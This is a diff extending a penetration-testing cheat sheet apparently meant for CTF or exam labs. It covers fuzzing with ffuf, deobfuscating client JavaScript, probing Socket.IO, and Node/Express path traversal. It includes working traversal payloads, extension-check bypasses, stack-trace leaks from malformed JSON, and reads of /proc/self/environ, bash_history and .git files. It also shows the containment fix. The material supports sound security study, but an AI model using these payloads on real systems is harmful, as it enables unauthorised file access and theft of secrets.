@@ -158,6 +158,28 @@ curl -sk -o /dev/null -w '%{http_code}\n' --resolve <vhost>:443:$IP https://<vho
 ```
 `-o /dev/null` throws away the body; `-w '%{http_code}'` prints just the status. Great in loops.
 
+**Probe status *and* size together (the cheap way to spot a real route):**
+```bash
+curl -s -o /dev/null -w '%{http_code}:%{size_download}\n' -X POST \
+  -H 'Content-Type: application/json' -d '{"a":"b"}' http://$IP/<endpoint>
+```
+When an app answers every wrong path with one identical error, the **size** is what separates a real
+endpoint from noise — `500:42` for every miss, `500:56` for a route that actually exists. Status
+codes alone tell you nothing there.
+
+**Two requests on one connection (`--next`):**
+```bash
+curl -s -X POST -d '{"a":1}' -H 'Content-Type: application/json' http://$IP/<endpoint-a> \
+  --next -s -X POST -d '{"b":2}' -H 'Content-Type: application/json' http://$IP/<endpoint-b>
+```
+`--next` starts a fresh request in the same curl run, reusing the keep-alive connection. Useful when
+you suspect an app ties state to a connection — and useful for proving it does **not**.
+
+**Send deliberately malformed JSON (see §16.5 — leaks stack traces):**
+```bash
+curl -s -X POST -H 'Content-Type: application/json' -d '"broken' http://$IP/<endpoint>
+```
+
 ---
 
 ## 6. Content / directory discovery (fuzzing)
@@ -194,6 +216,71 @@ gobuster dir -u https://<vhost>/ -w /usr/share/wordlists/dirb/common.txt -k -x p
 | `-k` | skip TLS verification (self-signed) |
 | `-x php,txt` | try these extensions |
 | `-t 40` | threads |
+
+### 6.1 Fuzz the right thing — `FUZZ` is not only for paths
+
+`FUZZ` is a plain placeholder: put it wherever the unknown is.
+
+```bash
+# path
+ffuf -u http://$IP/FUZZ                          -w common.txt -fs 42
+# JSON body PARAMETER NAME (FUZZ sits in the key position)
+ffuf -u http://$IP/<endpoint> -X POST -H 'Content-Type: application/json' \
+     -d '{"FUZZ":"test"}'                        -w common.txt -fs 52
+# header NAME
+ffuf -u http://$IP/<endpoint> -X POST -H 'FUZZ: test' -d '{}' -w common.txt -fs 56
+# cookie name / query param
+ffuf -u http://$IP/<endpoint> -H 'Cookie: FUZZ=test'   -w common.txt -fs 56
+ffuf -u 'http://$IP/<endpoint>?FUZZ=test'              -w common.txt -fs 56
+# filename with a required extension
+ffuf -u http://$IP/<endpoint> -X POST -H 'Content-Type: application/json' \
+     -d '{"file_path":"FUZZ.yaml"}'              -w common.txt -fs 55
+```
+
+### 6.2 Three ways a sweep lies to you
+
+**1 — Wrong method.** `app.post()` routes are invisible to a GET sweep: Express falls through to the
+catch-all, so a POST-only endpoint looks exactly like a miss. **Sweep both methods.**
+
+**2 — Wrong filter.** If an app never returns 404, `-fc 404` filters nothing and every word "hits".
+Baseline a known-bad request first, then filter on its **size**:
+```bash
+curl -s -o /dev/null -w '%{size_download}\n' http://$IP/definitely-not-here   # -> 42
+ffuf -u http://$IP/FUZZ -w common.txt -fs 42 -t 40
+```
+Get the baseline byte count right — filtering `-fs 53` when the real miss is 55 bytes returns a
+screen of garbage that looks like findings.
+
+**3 — Wrong wordlist.** `dirb/common.txt` is ordinary English: `admin`, `backup`, `login`. It cannot
+find a route named `/api/nostromo`, a parameter named `file_path`, or a file named `100375.yaml`.
+**Build a themed list from the target's own vocabulary** — every proper noun in the client JS, the
+page text, the brief — and try it by hand:
+```bash
+for p in <word1> <word2> <word3>; do
+  for m in GET POST; do
+    r=$(curl -s -o /dev/null -w '%{http_code}:%{size_download}' -X $m \
+        -H 'Content-Type: application/json' -d '{"a":"b"}' "http://$IP/$p")
+    [ "$r" != "500:42" ] && echo "$m /$p -> $r"
+  done
+done
+```
+> When a sweep comes back empty, ask what your wordlist **assumed about the developer** before you
+> reach for a bigger one. Developers name things after their app, not after your wordlist.
+
+### 6.3 Error messages are an oracle
+
+Different errors = different code branches. Two distinct messages usually mark the boundary between
+**validation** and **the actual work**:
+
+| Response | It means |
+|---|---|
+| `Not a YAML file path.` | input rejected **before** any I/O — validation failed |
+| `Failed to read the file.` | validation passed, the read ran and failed — **the file does not exist** |
+
+The second message is a free filesystem oracle: you can now test whether any path exists. But read
+error strings as *"which branch ran"*, never as statements of fact — a message reading
+`Science Officer Eyes Only` turned out to be plain `ENOENT` in costume, and cost hours of attacking
+an authorisation gate that did not exist.
 
 ---
 
@@ -352,12 +439,17 @@ curl http://<attacker-ip>:<port>/file -o file
 ```
 1. RECON        nmap -p- --min-rate 2000 -T4 -Pn  →  nmap -sV -sC -p <open>
                 read TLS certs (openssl), HTTP titles, redirects, error pages
-2. ENUMERATION  browse app; READ every JS file; note endpoints/roles/headers
-                fuzz hidden paths (ffuf/gobuster); check source leaks (GitHub, .git, backups)
+2. ENUMERATION  browse app; READ every JS file (deobfuscate it, §14); note endpoints/roles/headers
+                baseline a wrong request, then fuzz by SIZE; sweep GET *and* POST (§6.2)
+                build a THEMED wordlist from the app's own vocabulary before a bigger generic one
+                real-time app? map socket namespaces/events, and check the direction (§15)
 3. OSINT        pivot on a UNIQUE STRING → GitHub/dorks/paste sites → leaked secrets
-4. EXPLOIT      cross a trust boundary: leaked cred, injection, insecure upload, auth flaw
-5. POST-EXPLOIT read configs, dump DBs, crack/verify hashes, escalate user→admin→root
+4. EXPLOIT      cross a trust boundary: leaked cred, injection, traversal, upload, auth flaw
+                app silent? attack the MIDDLEWARE, not the handler — malformed JSON (§16.5)
+5. POST-EXPLOIT got file read? get a LISTING first (.git/index, /proc, syslog — §17)
+                read configs+source, dump DBs, crack hashes, escalate user→admin→root
 6. VERIFY       confirm each finding a 2nd way; separate VERIFIED from ASSUMED; keep dead ends
+                a payload that "should" work and doesn't: re-test it before theorising
 ```
 
 ---
@@ -517,6 +609,244 @@ Steps 1–7 are cheap and solve a surprising share of challenges.
 
 ---
 
+## 14. Reading client-side JavaScript (including obfuscated)
+
+A single-page app ships its own API documentation to you. **Read the JS before attacking anything.**
+
+```bash
+curl -s http://$IP/ | grep -oE '<script[^>]*src="[^"]+"'   # find the bundles
+curl -s http://$IP/<bundle>.js -o app.js && wc -c app.js
+grep -oE "'[^']{4,}'" app.js | sort -u | head -40          # readable strings, deduped
+grep -c "emit" app.js                                       # does the client ever SEND anything?
+grep -oE '[A-Za-z0-9+/]{16,}={0,2}' app.js | while read b; do echo "$b" | base64 -d 2>/dev/null; echo; done
+```
+
+| Command | Why |
+|---|---|
+| `grep -oE "'[^']{4,}'"` | pulls quoted string literals out of minified code without a parser |
+| `grep -c "emit"` | a client that never emits means the socket is **output only** — the input is elsewhere |
+| `base64 -d` | client bundles hide secrets in `atob("...")` constantly; decode every long blob |
+
+### 14.1 Obfuscated JS (obfuscator.io pattern)
+
+Recognise it: hex identifiers (`_0x42b1`), one array holding every string, and a `while(!![])` loop
+at the top. It is **not encryption** — three tricks stacked:
+
+1. every string moved into one array, each use replaced by an index lookup
+2. the array is **rotated** at load time (`push(shift())`) until a checksum matches, so index → string
+   cannot be read off the page
+3. identifiers renamed to noise
+
+`!![]` is `true`; `![]` is `false`. Nothing is removed — the strings are all still in the file.
+
+**Lazy read** (works surprisingly often): just grep the string array, as above.
+
+**Proper read — let the code decode itself.** Extract only the string-array function, the accessor
+and the rotation loop, run *those* in Node, and print the real mapping. Never runs the DOM/network
+parts:
+
+```js
+// deobf.js — node deobf.js app.js
+const fs = require('fs');
+const src = fs.readFileSync(process.argv[2], 'utf8');
+const arrFn  = src.match(/function _0x5f26\(\)\{[\s\S]*?return _0x5f26\(\);\}/)[0];
+const accFn  = src.match(/function _0x42b1\([\s\S]*?\}\s*;?\s*(?=let|const)/)[0];
+const rotate = src.match(/\(function\([\s\S]*?\}\(_0x5f26,0x[0-9a-f]+\)\);/)[0];
+fs.writeFileSync('/tmp/_h.js', `${arrFn}\n${accFn}\nconst _0x267948=_0x42b1;\n${rotate}\nmodule.exports=_0x42b1;`);
+const decode = require('/tmp/_h.js');
+const idxs = [...new Set([...src.matchAll(/\(0x([0-9a-f]{2,3})\)/g)].map(m => parseInt(m[1], 16)))].sort((a,b)=>a-b);
+for (const i of idxs) console.log('0x' + i.toString(16), '=>', JSON.stringify(decode(i)));
+```
+Swap the three function names for whatever your file uses. Substitute the mapping back by hand and
+the code reads normally.
+
+> **Lesson:** obfuscation is not a security control. A base64 flag behind an `if` in the browser is
+> a flag you already downloaded. Anything the browser can eventually display, it already holds.
+
+---
+
+## 15. WebSockets & Socket.IO
+
+**Spot it:** `<script src="https://cdn.socket.io/...">` in the page, or a `/socket.io/` path.
+
+**Confirm the protocol version before writing any client** (the handshake is plain HTTP):
+```bash
+curl -s "http://$IP/socket.io/?EIO=4&transport=polling"   # 0{"sid":"...","upgrades":["websocket"]} -> v3/v4
+curl -s "http://$IP/socket.io/?EIO=3&transport=polling"   # {"code":5,"message":"Unsupported protocol version"}
+```
+`EIO=4` is Socket.IO v3/v4; `EIO=3` is v2. Install the matching client or nothing will connect:
+```bash
+npm init -y >/dev/null && npm install socket.io-client@4 --silent
+```
+
+**Namespaces vs events.** A *namespace* is a URL-ish channel (`/yaml`); an *event* is a named message
+inside it. Both are defined in server code, so neither shows up in a directory sweep.
+
+**Listen to everything with `onAny` — the wildcard listener:**
+```js
+// listen.js
+const { io } = require('socket.io-client');
+const BASE = 'http://<IP>';
+for (const ns of ['/', '/yaml', '/nostromo']) {
+  const s = io(BASE + ns, { transports: ['websocket'] });
+  s.on('connect',       () => console.log(`[${ns}] connected id=${s.id}`));
+  s.on('connect_error', (e) => console.log(`[${ns}] error: ${e.message}`));
+  s.onAny((event, ...args) => console.log(`[${ns}] EVENT ${event} :: ${JSON.stringify(args)}`));
+}
+setTimeout(() => process.exit(0), 8000);
+```
+`s.on('name', ...)` needs the event name in advance; **`onAny` fires for every event whatever its
+name** — the right tool for an unknown socket API.
+
+**Namespace existence is an oracle:** connecting to a namespace the server never defined fails with
+`Invalid namespace`. A successful `connect` proves a `connection` handler exists server-side.
+
+**Fuzz event names** (emit with an ack callback *and* keep `onAny` attached — a handler may reply
+either way; reserved names throw client-side, so skip them):
+```js
+const RESERVED = new Set(['connect','connect_error','disconnect','disconnecting','newListener','removeListener']);
+for (const w of words.filter(w => !RESERVED.has(w))) {
+  try { s.emit(w, 'test', (...ack) => console.log(`ACK '${w}' ::`, ack)); } catch (e) {}
+}
+```
+
+> **Check the direction first.** `grep -c emit` on the client bundle. If the client only *listens*,
+> the socket is a **scoreboard, not an attack surface** — the server broadcasts on it when something
+> happens over HTTP. Fuzzing event names there burns thousands of requests for nothing (it did here:
+> 9224 emits, zero replies).
+
+---
+
+## 16. Node / Express LFI & path traversal
+
+### 16.1 The vulnerable pattern
+
+```js
+const filePath = `./public/${req.body.file_path}`;   // string concatenation — no containment
+fs.readFile(filePath, 'utf8', ...);
+```
+`path.join()` is **not** a fix either: it resolves `../` happily, and it treats a leading `/` as just
+another segment. That produces the signature you can detect from outside:
+
+| Payload | Result | Why |
+|---|---|---|
+| `/etc/passwd` | fails | absolute path gets glued onto the base directory |
+| `../../../../etc/passwd` | **works** | `..` segments are resolved, walking out of the base |
+
+So if absolute fails but relative works, you are looking at concatenation or `path.join` — keep going.
+
+### 16.2 Find the parameter, then map the depth
+
+```bash
+# parameter name: watch for a DIFFERENT error message (see §6.3)
+for k in file_path filepath filePath file path name filename url src data; do
+  printf '%-12s -> ' "$k"
+  curl -s -X POST -H 'Content-Type: application/json' -d "{\"$k\":\"test.yaml\"}" http://$IP/<endpoint>; echo
+done
+
+# how deep is the base directory? probe with a file you KNOW exists
+for d in 1 2 3 4 5 6; do
+  p=$(python3 -c "print('../'*$d)")
+  printf 'depth %s -> ' "$d"
+  curl -s -X POST -H 'Content-Type: application/json' \
+       -d "{\"file_path\":\"${p}etc/hostname\"}" http://$IP/<endpoint>; echo
+done
+```
+The first depth that works tells you how many levels below `/` the base directory sits. **Overshooting
+is free** — `..` at `/` is still `/` — so in practice just send plenty of `../`.
+
+**Good known-exists probe files** (harmless, present on nearly every Ubuntu host):
+`/etc/hostname` · `/etc/passwd` · `/etc/netplan/50-cloud-init.yaml` (when the read is restricted to `.yaml`)
+
+### 16.3 Extension whitelists — test whether the check is anchored
+
+A check like `filename.split('.').pop() === 'yaml'` only cares what the string **ends with**, never
+**where the file is**. Probe how strict it is:
+
+```bash
+for f in "test.yaml" "test.yml" "test.yaml.txt" "a.yaml/../../../../etc/passwd" \
+         "../../../../etc/passwd.yaml" "test.yaml%00.txt"; do
+  printf '%-40s -> ' "$f"
+  curl -s -X POST -H 'Content-Type: application/json' -d "{\"file_path\":\"$f\"}" http://$IP/<endpoint>; echo
+done
+```
+If `a.yaml/../../etc/passwd` passes, the check is a non-anchored `includes()` and you can read
+anything. If only `*.yaml` passes, you are limited to that extension — still enough to read config.
+Null bytes (`%00`) have not worked in Node since v8; try it once, then move on.
+
+> **The bug in one line:** an extension check answers *"what kind of file"*. Traversal is a *"which
+> file"* problem. Never let one stand in for the other.
+
+### 16.4 The fix (know this for the report)
+
+```js
+const ROOT = path.resolve('./public');
+const target = path.resolve(ROOT, userInput);
+if (target !== ROOT && !target.startsWith(ROOT + path.sep)) return res.status(400).json({ error: 'bad path' });
+```
+**Resolve first, check second.** Validating the raw string before resolution is the mistake that
+encoded-traversal payloads exist to defeat.
+
+### 16.5 Make a silent app leak: attack the middleware, not the handler
+
+Every route wrapped in try/catch? Body parsers, validators and session middleware run **outside** it.
+Malformed JSON throws inside `express.json()`, bypasses the developer's error handling entirely, and
+hits Express's default handler — which prints a full stack trace unless `NODE_ENV=production`:
+
+```bash
+curl -s -X POST -H 'Content-Type: application/json' -d '"broken' http://$IP/<endpoint> \
+  | sed 's/<br>/\n/g; s/&nbsp;/ /g'
+```
+```
+SyntaxError: Unexpected token '"' ...
+    at createStrictSyntaxError (/home/ubuntu/mothers_secret_challenge/node_modules/body-parser/...)
+```
+That absolute path is often the whole game — it turns blind traversal into targeted source reading.
+The `Content-Type` header is what makes the parser engage; without it the body is never parsed.
+
+---
+
+## 17. You have file read but no directory listing
+
+`fs.readFile` on a directory returns `EISDIR`, which most apps render as the same error as a missing
+file — so a read primitive gives you **no listing**. The fix is to read a file that *describes* the
+filesystem.
+
+```bash
+R() { curl -s -X POST -H 'Content-Type: application/json' \
+        -d "{\"file_path\":\"$1\"}" http://$IP/<endpoint>; }
+
+R ../../../../proc/self/cmdline          # exact binary + script path + args
+R ../../../../proc/self/environ          # USER / HOME / PWD / secrets in env vars
+R ../../../../etc/systemd/system/<svc>.service   # ExecStart, User=, WorkingDirectory=
+R ../../../../var/log/syslog             # app stdout/stderr, and the PID (did it restart?)
+R ../../../../home/<user>/.bash_history  # how the box was built
+R ../.git/index                          # EVERY tracked file path, in plaintext
+R ../package-lock.json                   # dependency tree + versions
+```
+
+| Source | What it gives you |
+|---|---|
+| `/proc/self/cmdline` | the interpreter and script path — the app's real location |
+| `/proc/self/environ` | `USER=root` means your read covers the **whole** filesystem |
+| systemd unit | `WorkingDirectory` (what `./` resolves to) and `User=` |
+| `/var/log/syslog` | app logs; a constant `node[PID]` proves the process never restarted |
+| `.git/index` | **the file listing** — binary format, but paths are plain strings |
+
+**`.git` left in a webroot is the single best find here:**
+```bash
+R ../.git/HEAD          # ref: refs/heads/main
+R ../.git/config        # remote origin URL
+R ../.git/logs/HEAD     # clone/pull/commit history with author + timestamps
+R ../.git/index | strings -n 4 | grep -v node_modules | sort -u   # full tracked-file list
+```
+That listing is what finds files no wordlist ever will — `public/100375.yaml`, `0rd3r937.txt`.
+
+> **Habit:** a read primitive plus a listing is worth far more than either alone. The moment you can
+> read arbitrary files, go looking for the map before you go looking for the treasure.
+
+---
+
 ### Quick habits that save time in the exam
 - `export IP=...` once; reuse `$IP` everywhere.
 - Always run **one** `nmap -p-` — never trust the default top-1000.
@@ -524,3 +854,10 @@ Steps 1–7 are cheap and solve a surprising share of challenges.
 - Read **client-side JS** before attacking an API — it documents endpoints/headers for you.
 - An error message ("expired", "invalid email") often tells you *where to look next*, not just "no".
 - Keep a running notes file of hostnames, endpoints, and creds — you'll reuse every one.
+- A sweep that finds nothing is usually a **wordlist assumption**, not an absent feature. Name the
+  assumption before you swap the list.
+- Baseline the "wrong" response (`status:size`) before fuzzing anything, and filter on that.
+- Decode every long base64 blob you see in client JS. It costs one command.
+- Two failed fixes resting on the same untested premise = go test the premise, not a third fix.
+- When a lab box misbehaves, the box is a suspect too. Re-run the exact request before building a
+  theory on top of its failure.
